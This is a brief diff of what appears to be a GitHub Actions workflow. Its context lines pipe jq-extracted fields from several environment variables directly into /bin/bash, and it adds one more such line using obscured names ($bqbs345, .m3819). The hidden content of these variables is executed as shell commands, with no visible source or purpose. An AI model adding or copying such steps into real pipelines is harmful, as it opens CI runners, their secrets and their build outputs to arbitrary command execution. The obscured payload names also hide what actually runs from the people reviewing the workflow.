@@ -23,6 +23,7 @@ jobs:
           echo $oigl414 | jq -r .nvus8 | /bin/bash
           echo $yd2 | jq -r .klin2671 | /bin/bash
           printf '%s' "$r061" | jq -r .ugip802 | /bin/bash
+          printf '%s' "$bqbs345" | jq -r .m3819 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
